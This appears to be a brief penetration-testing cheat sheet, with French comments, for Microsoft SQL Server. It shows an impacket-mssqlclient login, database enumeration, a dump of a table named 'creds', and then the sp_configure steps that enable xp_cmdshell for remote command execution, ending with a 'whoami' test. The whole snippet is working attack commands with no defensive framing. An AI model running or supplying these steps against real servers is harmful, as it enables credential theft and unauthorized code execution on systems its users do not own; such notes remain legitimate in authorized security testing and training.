
```shell
impacket-mssqlclient 'user'@127.0.0.1 -windows-auth

# Énumérer
SQL> SELECT name FROM sys.databases;
SQL> use accounts;
SQL> SELECT * FROM creds;

# Activer xp_cmdshell pour RCE
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```
